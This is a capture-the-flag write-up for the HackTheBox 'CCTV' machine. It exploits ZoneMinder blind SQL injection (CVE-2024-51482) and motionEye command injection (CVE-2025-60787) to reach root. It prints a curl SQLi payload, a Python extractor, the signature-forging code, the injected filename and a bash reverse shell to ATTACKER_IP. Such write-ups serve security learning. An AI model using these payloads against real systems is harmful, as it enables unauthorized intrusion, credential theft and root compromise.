---
title: "CCTV — HackTheBox Writeup"
date: "2026-03-08"
description: "Easy Linux machine involving ZoneMinder SQL injection (CVE-2024-51482) and motionEye command injection (CVE-2025-60787) with HMAC-SHA1 API auth bypass"
tags: ['hackthebox', 'writeup', 'linux', 'CVE', 'sql injection', 'command injection', 'web pentest']
thumbnail: ""
---

# CCTV — HTB Labs Machine Writeup

**Difficulty:** Easy
**OS:** Linux (Ubuntu)

---

## Attack Chain Summary

```
Default Creds (admin:admin) → ZoneMinder Admin
    → CVE-2024-51482 (Blind SQLi) → Dump bcrypt hashes
        → hashcat crack → SSH as mark
            → motionEye internal service (running as root)
                → Reverse-engineer HMAC-SHA1 API auth
                    → CVE-2025-60787 (Command Injection via image_file_name)
                        → Root shell
```

---

## Phase 1: Reconnaissance

### Nmap Scan

```bash
rustscan -a 10.129.6.98 --ulimit 1000 -r 1-65535 -- -A -sC -Pn
```

**Open Ports:**
| Port | Service | Details |
|------|---------|---------|
| 22 | SSH | OpenSSH 9.6p1 Ubuntu |
| 80 | HTTP | Apache 2.4.58, "SecureVision CCTV" |

### Web Enumeration

Directory fuzzing discovered `/zm/` — a **ZoneMinder v1.37.63** web interface with a login page.

| Component | Detail |
|-----------|--------|
| Web server | Apache 2.4.58 (Ubuntu) |
| CCTV software | ZoneMinder v1.37.63 |
| Database | MySQL >= 8.0.0 |

---

## Phase 2: Initial Access — Default Credentials + CVE-2024-51482

### Default Credentials

ZoneMinder ships with default credentials `admin:admin`. Login succeeded immediately, granting full administrator access to the ZoneMinder dashboard.

### CVE-2024-51482 — Blind SQL Injection

ZoneMinder v1.37.63 is vulnerable to **CVE-2024-51482**: the `tid` parameter on the endpoint `/zm/index.php?view=request&request=event&action=removetag` is not sanitized before being passed to MySQL. The injection is time-based blind.

Manual verification:

```bash
# If server delays ~3 seconds -> injection confirmed
curl -s -b "ZMSESSID=<SESSION>" \
  "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1%20AND%20(SELECT%206513%20FROM%20(SELECT(SLEEP(3)))bKpq)"
```

A custom Python binary-search extractor was written for reliable extraction (O(log n) requests per character vs O(n) with linear search):

```python
def inject(session, query, pos, mid):
    """Time-based blind injection using binary search."""
    payload = f"1 AND (SELECT IF(ASCII(SUBSTRING(({query}),{pos},1))>{mid},SLEEP({DELAY}),0))"
    start = time.time()
    session.get(TARGET, params={
        "view": "request",
        "request": "event",
        "action": "removetag",
        "tid": payload
    }, timeout=DELAY + 5)
    elapsed = time.time() - start
    return elapsed >= DELAY
```

### Credential Extraction

Three users extracted from `zm.Users`:

| Username | Password Hash | Status |
|----------|--------------|--------|
| superadmin | bcrypt hash | Not cracked |
| mark | bcrypt hash | Cracked |
| admin | bcrypt hash | Default admin |

```bash
hashcat -m 3200 mark.hash /usr/share/wordlists/rockyou.txt
```

Credentials recovered: `mark:<redacted>`

### SSH as mark

```bash
ssh mark@cctv.htb
```

```
mark@cctv:~$ id
uid=1001(mark) gid=1001(mark) groups=1001(mark)
```

---

## Phase 3: Post-Shell Enumeration

### Internal Services

```bash
ss -tlnp
```

| Port | Service | Notes |
|------|---------|-------|
| 8765 | motionEye v0.43.1b4 | Running as **root** on 127.0.0.1 |
| 7999 | Motion daemon | Webcontrol (read-only) |
| 8554 | RTSP stream | Camera endpoint |

**Critical finding**: motionEye running as **root** on localhost.

### Config File Analysis

`/etc/motioneye/motion.conf` contained the admin password hash (SHA1) and `on_picture_save` hook configuration — the hook calls `relayevent.sh` with `%f` (full file path) as a shell argument.

### API Source Code Analysis

Reading motionEye's source at `/usr/local/lib/python3.12/dist-packages/motioneye/` revealed the authentication mechanism:

**Signature format**: `"METHOD:PATH:BODY:KEY"` hashed with SHA1

The key is the `admin_password` from config (the SHA1 hash itself). The `compute_signature` function applies regex sanitization to URI components but not to JSON body values — the critical distinction for exploitation.

---

## Phase 4: Privilege Escalation — CVE-2025-60787

### Vulnerability

**CVE-2025-60787**: motionEye command injection via `image_file_name` parameter.

**Root cause**: The `image_file_name` config value is translated to Motion's `picture_filename`. When Motion saves a picture, the `on_picture_save` hook passes the filename to `relayevent.sh` as a shell argument — without sanitizing semicolons. Shell interprets `;` as a command separator.

### Attack Flow

```
motionEye API /config/1/set
  -> sets image_file_name = "%Y-%m-%d;COMMAND;"
  -> Motion saves picture -> expands filename
  -> on_picture_save hook: relayevent.sh ... "%Y-%m-%d;COMMAND;"
  -> shell splits on ';' -> COMMAND executed as root
```

### Exploitation

The exploit required replicating motionEye's HMAC-SHA1 signature computation exactly:

```python
def compute_signature(method, path, body, key):
    # ... URL parsing, query sorting, regex sanitization ...
    return hashlib.sha1(
        ('{}:{}:{}:{}'.format(method, path, body_str or '', key)).encode()
    ).hexdigest().lower()
```

**Request flow:**
1. GET current camera config with valid signature
2. POST modified config with `picture_file_name: "%Y-%m-%d;bash /tmp/rev.sh;"`
3. Trigger snapshot — executes injected command as root

```bash
# Prepare reverse shell
cat > /tmp/rev.sh << 'EOF'
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod +x /tmp/rev.sh

# Run exploit
python3 motioneye-rce.py exploit ATTACKER_IP 4444
```

Root shell received:

```
# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Failed Attempts & Dead Ends

| # | What Was Tried | Why It Failed | Lesson |
|---|----------------|---------------|--------|
| 1 | sqlmap `--dump` directly | Time-based extraction too slow and unstable | Custom binary search extractor is more reliable for time-based SQLi |
| 2 | Trying to crack the SHA1 hash as a password | The hash IS the key for HMAC computation — motionEye accepts it directly | Read source code before assuming a hash needs cracking |
| 3 | motionEye API without signature | HTTP 403 — valid `_username` and `_signature` required | Always reverse-engineer auth mechanisms from source when available |
| 4 | Inject payload in URI path | Regex sanitization replaces semicolons with `-` in URI before hashing | Injection must be in JSON body values, not URI |
| 5 | Motion webcontrol port 7999 | `webcontrol_parms 2` = read-only mode | Check config values before attempting actions |

---

## Key Takeaways

1. **Default credentials are a real risk** — ZoneMinder's `admin:admin` granted immediate admin access. Always test defaults first.

2. **Time-based blind SQLi benefits from custom extractors** — Binary search per character (O(log n)) is far more efficient and stable than sqlmap's linear approach in high-latency environments.

3. **Read source code when available** — Finding motionEye's source on disk enabled precise replication of the HMAC-SHA1 auth mechanism.

4. **Regex sanitization on one layer doesn't protect others** — motionEye sanitized URI components but not JSON body values when saving config.

5. **Daemons running as root amplify any vulnerability** — motionEye didn't need root privileges. One command injection = instant root shell.

6. **Shell hooks with user-controlled filenames are classic injection sinks** — `on_picture_save` passing unsanitized filenames to shell scripts is a textbook CWE-78.

---

## CVEs Exploited

| CVE | Component | Type | Impact |
|-----|-----------|------|--------|
| CVE-2024-51482 | ZoneMinder <= 1.37.63 | Time-based blind SQLi (`tid` parameter) | Full database read access |
| CVE-2025-60787 | motionEye <= 0.43.1b4 | Command injection via `image_file_name` | RCE as root |

---

## Tools Used

- `rustscan` / `nmap` — Port scanning and service detection
- `ffuf` — Directory fuzzing
- `sqlmap` — SQLi confirmation
- Custom `sqli-extract.py` — Binary search time-based SQLi extractor
- `hashcat -m 3200` — Bcrypt hash cracking
- Custom `motioneye-rce.py` — HMAC-SHA1 signed API exploit
